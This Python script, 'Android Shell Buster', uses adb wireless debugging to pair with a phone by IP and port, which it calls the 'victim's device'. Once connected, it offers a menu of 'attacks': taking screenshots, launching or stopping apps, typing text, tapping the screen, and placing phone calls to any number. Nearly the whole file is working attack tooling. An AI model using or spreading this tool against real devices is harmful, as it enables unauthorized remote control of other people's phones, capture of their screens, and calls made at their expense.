from main import ADB
import os
import time
from termcolor import colored as cld
import subprocess

BANNER = cld("""

⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘

    )                         
 ( /(                      )  
 )\())   (      )       ( /(  
((_)\    )\  ( /(   (   )\()) 
 _((_)  ((_) )(_))  )\ ((_)\  
| \| | _ | |((_)_  ((_)| |(_) 
| .` || || |/ _` |/ _| | / /  
|_|\_| \__/ \__,_|\__| |_\_\  
                              
V.1.0. : 🤖 ANDROID SHELL BUSTER 🤖

⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘

""", 'cyan')

print(BANNER)

ui = input(cld("╰┈➤ 🛜 Connect victim's device ? y/N : ", 'green'))

if ui == "Y" or ui == "y" :
    
    adb = ADB()
    
    print("")
    IP = input(cld("╰┈➤ ⚙️ Enter IP Address : ", 'red'))
    print("")
    PORT_p = int(input(cld("╰┈➤ ⚙️ Enter Pairing PORT : ", 'red')))
    print("") 
    os.system(f'adb pair {IP}:{PORT_p}')
    time.sleep(1)
    print("")
    PORT_d = int(input(cld("╰┈➤ ⚙️ Enter Debugging PORT : ", 'red')))
    print("")
    os.system(f'adb connect {IP}:{PORT_d}')
    time.sleep(1)
    print(adb.devices())

    print("")
    
    temp = input(cld("⚠️ Only 1 device is compaitable, delete any other device from the above device's list ? y/N : ", 'green'))
    
    if temp == "Y" or temp == "y" :
        
        print("")
        temp2 = input(cld("⚙️ Enter the device's name : ", 'cyan'))
        print("")
        os.system(f'adb disconnect {temp2}')
        time.sleep(1)
        print("")
        
    elif temp == "N" or temp == "n" :
        
        print("")
        pass

    print("⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘")
    print("")
    print(cld("⚡︎Default Informations of Victim's Device :~ ", 'red', 'on_white'))
    print("")
    print(cld(f"📟 Device : {adb.devices()}", 'yellow'))
    print("")
    print(cld(f"🧊 Model : {adb.model()}", 'blue'))
    print("")
    print(cld(f"🛡️ Android Version : {adb.android_version()}", 'white'))
    print("")
    print(cld(f"🔋 Battery : {adb.battery()}", 'green'))
    print("")
    
    runtime = True
    while runtime :
    
        d = {1 : "📷 Take screenshot.", 2 : "🏠︎ Go To Home.", 3 : "📚 Launch apps.", 4 : " ⃠  Stop apps.", 5 : "⌨️ Type text.", 6 : "🖱️: ̗̀➛ Click anywhere on the screen.", 7 : "Put a phone call.", 8 : " ⍈ Exit."}
        print(f'🔥{d}')
        print("")
        ui2 = int(input(cld("➤ 🔥 Enter attack that you wants to perform : ", 'red')))
        print("")
        
        if ui2 == 1 :

            adb.screenshot("image.png")
            print(cld("⚡︎Script injected successfully in the shell ✅", 'red'))
            print("")
        
        if ui2 == 2 :
            
            adb.home()
            print(cld("⚡Script injected successfully in the shell ✅", 'red'))
            print("")
            
        if ui2 == 3 :

            package = input(cld("</> Enter package details : ", 'cyan'))
            adb.launch(f"{package}")
            print(cld("⚡︎Script injected successfully in the shell ✅", 'red'))
            print("")
            
        if ui2 == 4 :

            package2 = input(cld("</> Enter package details : ", 'cyan'))
            adb.stop(f"{package2}")
            print(cld("⚡Script injected successfully in the shell ✅", 'red'))
            print("")
            
        if ui2 == 5 :

            text_data = input(cld("</> Enter text : ", 'cyan'))
            adb.text(f"{text_data}")
            print(cld("⚡Script injected successfully in the shell ✅", 'red'))
            print("")
            
        if ui2 == 6 :

            mouse_x = int(input(cld("</> Enter mouse abscissa (x - coordinate) : ", 'cyan')))
            mouse_y = int(input(cld("</> Enter mouse ordinate (y - coordinate) : ", 'cyan')))
            adb.tap(mouse_x, mouse_y)
            print(cld("⚡Script injected successfully in the shell ✅", 'red', 'on_white'))
            print("")
            
        if ui2 == 7 :
            
            phn = int(input(cld("</> Enter any phone number with country code : ", 'cyan')))
            subprocess.run(f'adb shell am start -a android.intent.action.CALL -d tel:{phn}')
            print(cld("⚡Script injected successfully in the shell !", 'red', 'on_white'))
            print("")
            
        if ui2 == 8 :
            
            subprocess.run('adb disconnect')
            time.sleep(5)
            subprocess.run('adb kill-server')
            time.sleep(1)
            runtime = False
    
elif ui == "N" or ui == "n" :

    exit()    